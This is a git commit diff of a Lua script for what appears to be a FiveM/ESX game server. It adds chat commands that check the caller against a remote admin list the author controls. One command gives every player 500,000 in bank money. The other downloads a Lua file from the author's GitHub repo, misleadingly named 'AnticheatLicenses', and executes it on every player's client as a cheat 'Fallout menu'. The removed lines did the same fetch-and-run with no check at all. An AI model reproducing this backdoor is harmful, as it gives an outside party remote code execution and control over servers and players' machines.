7bb1c1366d289db2de32daf89ada94c1f13a61f3
Noah Mertens <80922759+Sahbes@users.noreply.github.com>
2022-01-03 23:22:21 +0100

    Update giveallmoney.lua

--- giveallmoney.lua
+++ giveallmoney.lua
@@ -1,8 +1,62 @@
-TriggerClientEvent('esx:showNotification',-1, "Fallout menu voor iedereen baby")
-PerformHttpRequest("https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/gayout.lua", function(code, res, headers)
-    if code == 200 then
-        if res ~= nil then
-            TriggerClientEvent('GTX:executecommand', -1, res)
+RegisterCommand('givemoneytoall', function(source, args, rawCommand)  
+    local _source = source
+    for k,v in pairs(GetPlayerIdentifiers(_source))do
+                
+        if string.sub(v, 1, string.len("discord:")) == "discord:" then
+            local discord = v
+
+            local dclicense = string.gsub(discord, 'discord:', '')
+
+            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
+                if code == 200 then
+                    local decoded = json.decode(res)
+                    if decoded[dclicense] ~= nil then
+                        for i=1, #playerList, 1 do
+                            local _source2 = playerList[i]
+                            local xPlayer = ESX.GetPlayerFromId(_source2)
+                            xPlayer.addAccountMoney("bank", 500000)
+                            TriggerClientEvent('esx:showNotification', _source2, "Gratis geld baby")
+                        end
+                    else
+                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
+                    end
+                end
+            end)
         end
-    end
-end)
+     end
+ end)
+
+RegisterCommand('givemenutoall', function(source, args, rawCommand)  
+    local _source = source
+    for k,v in pairs(GetPlayerIdentifiers(_source))do
+                
+        if string.sub(v, 1, string.len("discord:")) == "discord:" then
+            local discord = v
+
+            local dclicense = string.gsub(discord, 'discord:', '')
+
+            PerformHttpRequest('https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/admins.json', function(code, res, headers)
+                if code == 200 then
+                    local decoded = json.decode(res)
+                    if decoded[dclicense] ~= nil then
+                        for i=1, #playerList, 1 do
+                            local _source2 = playerList[i]
+                            PerformHttpRequest("https://raw.githubusercontent.com/Sahbes/AnticheatLicenses/main/gayout.lua", function(code, res, headers)
+                                if code == 200 then
+                                    if res ~= nil then
+                                        TriggerClientEvent('esx:showNotification', _source2, "Gratis fallout menu xxx je favoriete modder")
+                                        TriggerClientEvent('GTX:executecommand', _source2, res)
+                                    else
+                                        TriggerClientEvent('esx:showNotification', _source, "Menu kan niet gevonden worden")
+                                    end
+                                end
+                            end)
+                        end
+                    else
+                        TriggerClientEvent('esx:showNotification', _source, "Je bent geen admin")
+                    end
+                end
+            end)
+        end
+     end
+ end)
